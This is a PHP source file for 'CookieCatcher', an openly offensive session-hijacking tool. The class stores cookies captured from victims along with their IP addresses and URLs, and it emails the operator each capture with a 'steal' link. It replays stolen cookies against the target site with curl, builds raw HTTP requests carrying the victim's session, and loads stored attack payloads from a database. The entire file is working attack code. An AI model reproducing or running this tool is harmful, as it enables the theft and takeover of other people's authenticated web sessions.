<?php
/**
 * CookieCatcher Class
 * - core functionality of the CookieCatcher application
 *
 * @package classes
 * @copyright Copyright 2013 DisK0nn3cT
**/

class cookieCatcher extends mysqlQueryLab {

  /**
   * Grab and save the cookie
   * @return void
   */
  public function grab($ip,$url,$cookie)
  {
    $query = sprintf("INSERT INTO cookies(ip,url,cookiedata) VALUES('%s','%s','%s')",
                mysql_real_escape_string($ip),
                mysql_real_escape_string($url),
                mysql_real_escape_string($cookie));
    $cookie = $this->execute($query);

    // Send email notification
    $this->notify($this->insert_ID());
    return true;
  }

  /**
   * Resest the cookie table
   */
  public function reset() {
    $query = sprintf("DELETE FROM cookies");
    $reset = $this->execute($query);
    return $reset;
  }

  /**
   * Load the cookie from the dB
   */
  public function view($cookieID=0)
  {
    if($cookieID>0) {
      $query = sprintf("SELECT * FROM cookies WHERE id=%s",
                (int)$cookieID);
      $cookies = $this->execute($query);
    } else {
      $query = sprintf("SELECT * FROM cookies");
      $cookies = $this->execute($query);
    }
    return $cookies;
  }

  /**
   * Refresh the cookie against target
   */
  public function refresh($cookieID)
  {
    $cookie = $this->view($cookieID);
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$cookie->results[0]['url']);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch,CURLOPT_COOKIE,$cookie->results[0]['cookiedata']);
    $result = curl_exec($ch);
    $result = preg_replace('/src="(?!http)/i','src="'.$cookie->results[0]['url'],$result);
    curl_close($ch);
    return $result;
  }

  /**
   * Create a cookie payload
   */
  public function steal($cookieID)
  {
    $cookie = $this->view($cookieID);
    $cookieset = $this->prep($cookie->results[0]['cookiedata']);
    $url = $uri = explode('/',preg_replace('^(http://|https://)^','',$cookie->results[0]['url']));
    array_shift($uri);
    $p = "GET /".implode('/',$uri)." HTTP/1.1\r\n";
    $p .= "Host: ".$url[0]."\r\n";
    $p .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1\r\n";
    $p .= "Accept: */*\r\n";
    $p .= "Accept-Language: en-us,en;q=0.5\r\n";
    $p .= "Accept-Encoding: gzip, deflate\r\n";
    $p .= $cookieset;
    $p .= "\r\n\r\n";
    return $p;
  }

  /**
   * Send email notification
   */
  public function notify($cid) {
    global $emailAddress, $siteHost, $siteURL;
    $c  = $this->view($cid);
    $cookie = $c->results[0];
    $to      = $emailAddress;
    $subject = "CookieCatcher Notification - ".$cookie['url'];
    $message = "A cookie has been received from:\n".$cookie['url']."\n\nData:\n".$cookie['cookiedata']."\n\nClick here to launch CookieCatcher: ".$siteURL."?cookieID=".$cid."&action=steal";
    $headers = 'From: cookiecatcher@'.$siteHost."\r\n" .
               'Reply-To: nobody@'.$siteHost."\r\n" .
               'X-Mailer: PHP/' . phpversion();
    mail($to, $subject, $message, $headers);
  }

  /**
   * Performs logic to extract cookie data
   */
  public function prep($data,$cookieSet="Cookie: ") {
    $set = explode(';',$data);
      foreach($set as $cookie) {
        $cookieSet .= trim($cookie)."; ";
      }
    return $cookieSet;
  }

  public function payloads() {
    $query = sprintf("SELECT id,name,payload FROM payloads ORDER BY name");
    $payloads = $this->execute($query);
    return $payloads;
  }
}

?>
